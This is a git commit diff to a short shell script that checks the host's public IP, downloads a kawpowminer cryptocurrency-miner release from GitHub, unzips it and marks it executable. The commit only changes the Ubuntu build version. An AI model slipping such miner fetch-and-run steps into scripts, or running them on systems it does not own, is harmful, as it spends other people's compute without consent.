01999e2579936e2381bd77276552d6571586445a
one10001 <78626503+one10001@users.noreply.github.com>
2021-02-22 00:15:13 +0100

    Update rv.sh

--- rv.sh
+++ rv.sh
@@ -1,7 +1,7 @@
 #!bin/bash -xe 
 curl ipinfo.io
-wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu16-1.2.3.zip
-unzip kawpowminer-ubuntu16-1.2.3.zip
+wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
+unzip kawpowminer-ubuntu18-1.2.3.zip
 ls -la
 chmod +x kawpowminer
 ls -la kawpowminer
